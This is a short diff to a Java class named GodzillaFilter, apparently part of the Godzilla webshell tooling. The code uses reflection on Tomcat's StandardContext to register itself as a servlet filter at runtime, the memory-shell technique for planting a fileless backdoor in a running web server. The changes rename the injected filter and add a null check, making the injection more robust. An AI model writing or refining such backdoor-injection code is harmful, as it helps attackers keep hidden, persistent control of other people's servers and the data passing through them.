@@ -172,7 +172,7 @@ public class GodzillaFilter extends ClassLoader implements Filter {
     public String addFilter() throws Exception {
         ServletContext servletContext = this.request.getServletContext();
         Filter filter = this;
-        String filterName = this.path;
+        String filterName = "GodzillaFilter" + this.path;
         String url = this.path;
 
         Field contextField = null;
@@ -236,7 +236,9 @@ public class GodzillaFilter extends ClassLoader implements Filter {
             }
 
             filterRegistration = servletContext.addFilter(filterName, filter);
-            filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
+            if (filterRegistration != null) {
+                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
+            }
             Method filterStartMethod = StandardContext.class.getMethod("filterStart");
             filterStartMethod.setAccessible(true);
             filterStartMethod.invoke(standardContext, (Object[])null);
